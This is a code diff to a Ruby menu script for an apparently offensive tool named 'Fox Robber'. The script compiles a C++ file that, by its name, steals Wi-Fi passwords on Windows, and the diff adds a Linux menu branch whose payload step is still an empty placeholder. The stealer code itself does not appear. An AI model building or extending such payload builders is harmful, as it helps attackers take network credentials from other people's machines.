@@ -28,13 +28,13 @@ while true
   case command
   when '1', 'fox-robber'
     system('clear')
-    puts "Enter target OS:\n[4]. Windows"#\n[5]. Mac\n[6]. Linux\n[7]. Android\n[8]. IOS\n[0]. Back"
+    puts "Enter target OS:\n[4]. Windows\n[5]. Linux" # \n[6]. Mac\n[7]. Android\n[8]. IOS\n[0]. Back"
     job = 'fox-robber'
     while true
       job = 'fox-robber'
       print "(#{job})>"
       command_fox_robber = gets.chomp
-      if %w[4 fox-robber].include?(command_fox_robber)
+      if %w[4 windows].include?(command_fox_robber)
         while true
           if %w[0 back].include?(command_fox_robber)
             system('clear')
@@ -48,12 +48,11 @@ while true
               print "(#{job})>"
               command_windows = gets.chomp
               case command_windows
-              when '9', 'steal wifi password'
+              when '9', 'steal-wifi-password'
                 system('g++ Windows/Windows_Steal\ WIFI\ password.cpp')
                 system('mv a.out Windows_Steal_WIFI_password.out')
                 system('chmod +x Windows_Steal_WIFI_password.out')
                 system('mv Windows_Steal_WIFI_password.out Out/')
-                #system('clear')
                 puts 'Loading...'
                 puts 'File made by Fox Robber 🦊'
                 system("echo \"\t<Press enter>\" | lolcat -a")
@@ -66,6 +65,29 @@ while true
           end
         end
         break
+      elsif %w[5 linux].include?(command_fox_robber)
+        while true
+          if %w[0 back].include?(command_fox_robber)
+            system('clear')
+            break
+          else
+            system('clear')
+            puts "What do you want:\n[9]. Steal WIFI password\n[0]. Back"
+            job = 'fox-robber [linux]'
+            print "(#{job})>"
+            command_linux = gets.chomp
+            case command_linux
+            when '9', 'steal-wifi-password'
+              ### run crystal code ###
+              puts 'File made by Fox Robber 🦊'
+              system("echo \"\t<Press enter>\" | lolcat -a")
+              gets.chomp
+              break
+            when '0', 'back'
+              break
+            end
+          end
+        end
       elsif %w[0 back].include?(command_fox_robber)
         system('clear')
         break
